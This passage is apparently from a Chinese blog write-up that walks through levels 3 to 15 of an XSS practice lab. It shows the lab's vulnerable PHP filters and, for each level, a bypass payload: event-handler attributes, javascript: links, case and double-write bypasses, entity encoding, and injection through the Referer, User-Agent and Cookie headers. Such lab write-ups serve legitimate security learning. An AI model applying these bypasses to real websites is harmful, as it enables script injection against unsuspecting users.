class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>果然是添加了<code>htmlspecialchars()</code>函数进行了过滤，所以这里不能再用闭合标签的方法来构造弹窗了，采取闭合value引号，<strong>添加html事件属性</strong>的方法来构造弹窗：</p><p>payload：<code>&#39; onkeypress=&#39;alert(&quot;hacker&quot;)</code>，在输入框中敲击键盘即可弹窗；</p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>和level-3几乎一样，测试发现输出点，<code>&lt;input name=keyword  value=&quot;test2333&quot;&gt;</code></p><p>发现这次是双引号，直接闭合，构造html事件属性造成弹窗即可；</p><p>payload：<code>?keyword=&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></p><p>level-3和4这里需要注意的是闭合的到底是双引号还是单引号，里面的alert引号也需要随之变化，不能使用同样的引号，否则会达不到效果；</p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>上来还是像上面一样尝试闭合引号，添加一个html事件属性，但是这次已经不起作用，查看html发现：</p><p><a href="https://imgchr.com/i/Ar6FM9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/31/Ar6FM9.png" alt="Ar6FM9.png"></a></p><p>事件属性貌似也被过滤了……这好像就触及到我的知识盲点了，google一波发现可以使用html链接，所以直接闭合引号和标签，再写入一个html链接，链接效果为弹窗即可：</p><p>payload：<code>&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt; //</code></p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现果然是不能使用<code>&lt;script&gt;</code>标签和事件属性，全部都被替换掉了……</p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>直接查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>链接属性也别过滤掉了…心碎…</p><p>但是仔细对比一下就可以发现，这一关没有进行小写转换，<code>$str = strtolower($_GET[&quot;keyword&quot;]);</code>这是极其重要的，因为html对大小写是不敏感的，即使是大写也可以正常运行，所以直接可以用大写绕过…</p><p>payload:<code>&quot;&gt; &lt;a Href=&quot;javascript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt;</code></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相信打过ctf的人都知道<code>str_replace()</code>这个函数在代码审计里的漏洞，替换为空时可以直接双写绕过</p><p>payload：<code>&quot;&gt; &lt;a hrhrefef=&quot;javascscriptript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt; //</code></p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>这一关貌似和前面的都不太一样，回显有两个输出的地方，发现第二个输出是：把你输入的内容当做一个链接内容放在href属性里面，所以这一关应该就是构造一个可以绕过script字符串替换的字符，</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现这里双引号都被过滤掉了，那肯定是不可以闭合标签了，问题就是链接里的<code>javascript:alert(&#39;hacker&#39;)</code></p><p>script会被替换，要想办法绕过即可，既然是链接，直接unicode编码即可：</p><p>payload:<code>java&amp;#115;cript:alert(1)</code></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><p>这一关有点奇怪，直接查看源码吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现相比上一关，多了一个if判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br></pre></td></tr></table></figure><p>也就是说我们构造的字符串里必须要含有<code>http://</code>这样的字符，结合上一关，需要在字符中添加<code>http://</code>的字符，并且还不能让其起作用…直接注释掉即可：</p><p>payload:<code>java&amp;#115;cript:alert(1)//http://</code></p><h2 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现GET了两个值，分别是<code>keyword</code>和<code>t_sort</code>；</p><p><code>keyword</code>不多说，GG……输出点只有一个，而且被过滤了…</p><p>另一个切入点就是t_sort参数，查看代码发现是滤掉了<code>&lt;和&gt;</code>，那标签一类的就不可以使用了，输出点属性hidden，所以看不见；</p><p>这里我们使用另一种绕过方法，先闭合value的引号，然后添加html事件属性，随后设置type为text(对同一属性赋不同的值时，浏览器解析时只会解析第一次出现的属性)；</p><p>payload:<code>?keyword=test&amp;t_sort=&quot; onkeypress=&quot;alert(&#39;hacker&#39;)&quot; type=&quot;text&quot;&gt;</code></p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h2><p>查看源代码发现又多了一个参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那这一关肯定又是在t_ref上做文章…先看看它的值是什么：<code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code>发现是上一个跳转页面的url，而且过滤掉了<code>&lt; &gt;</code>，其实也好办…和上一个是一个套路，就是直接闭合引号，然后添加事件属性构造弹窗，接着覆盖type即可，只不过这一步需要从上一个页面用bp抓包去修改参数…</p><p>上一个页面即将跳转时抓包：</p><p><a href="https://imgchr.com/i/AyFOWn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/01/AyFOWn.md.png" alt="AyFOWn.md.png"></a></p><p>修改Referer请求头，forward一下，即可构成弹窗事件；：</p><p><img src="https://s2.ax1x.com/2019/04/01/AykQFH.png" alt="AykQFH.png"></p><p>payload:<code>Referer: &quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>基本上换汤不换药，就是从上一题的Referer请求头参数变成了UA头……</p><p><a href="https://imgchr.com/i/Ayk20U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/01/Ayk20U.md.png" alt="Ayk20U.md.png"></a></p><p>直接用上一关的payload即可</p><p>payload：<code>User-Agent: &quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现又有一个新参数cookie…套路一样，不多说</p><p>payload：<code>Cookie: user=&quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h2><p>查看源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现链接:<code>www.exifviewer.org</code>；应该是个漏洞环境…但是可能下线了…没有办法做，但是也可以了解一波；</p><p>这个漏洞是利用上传图片的Exif（可以记录数码照片的属性信息和拍摄数据，Exif信息是可以被任意编辑的）值进行构造xss（真的是骚），也算是个存储型xss；</p><p>附上此漏洞的乌云镜像链接：<a href="http://www.anquan.us/static/bugs/wooyun-2012-07468.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2012-07468.html</a></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><p>摸不着头脑…只好查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是使用了一个<code>ng-include</code>指令，先来了解一下用法：</p><p><a href="https://imgchr.com/i/A60n1J" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/02/A60n1J.md.png" alt="A60n1J.md.png"></a></p><p>也就是常说的文件包含，先包含一个同一个目录下的文件试一下：</p><p><a href="https://imgchr.com/i/A6sGqA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/02/A6sGqA.md.png" 